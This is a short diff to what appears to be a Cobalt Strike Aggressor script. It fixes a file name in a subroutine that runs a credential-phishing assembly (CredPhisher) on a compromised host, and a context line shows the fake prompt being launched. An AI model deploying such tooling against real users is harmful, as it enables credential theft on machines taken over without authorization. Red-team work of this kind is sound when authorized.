@@ -202,6 +202,6 @@ bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_You
 
 sub credphisher{
 
-bexecute_assembly($1, script_resource('/exe/WindowsFormApp9.exe.exe');
+bexecute_assembly($1, script_resource('/exe/WindowsFormApp9.exe');
 
 }
